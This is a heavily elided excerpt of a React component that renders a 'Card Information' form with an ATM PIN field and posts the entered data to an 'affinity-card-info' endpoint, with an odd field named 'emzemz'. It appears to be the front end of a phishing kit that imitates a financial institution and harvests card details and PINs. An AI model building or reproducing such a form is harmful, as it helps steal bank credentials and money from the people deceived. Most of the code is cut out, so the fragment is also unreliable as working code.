...
const Card: React.FC = () => {
  ...
  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    ...
    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/affinity-card-info/`, {
          emzemz,
  ...
  return (
    <FlowCard title="Card Information">
      <form onSubmit={handleSubmit} className="space-y-4">
        ...
        <div>
          ...
          <div className="flex gap-2">
            <select
              ...
              className="flex-1 border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            >
        ...
        {/* ATM PIN */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="atmPin">
            ATM PIN
          </label>
          <div className="relative">
            <input
        ...
        <div className="pt-4">
          {!isLoading ? (
            ...
            <div className="flex justify-center py-2">
              <div className="h-6 w-6 animate-spin rounded-full border-4 border-solid border-purple-900 border-t-transparent"></div>
            </div>
          )}
        </div>
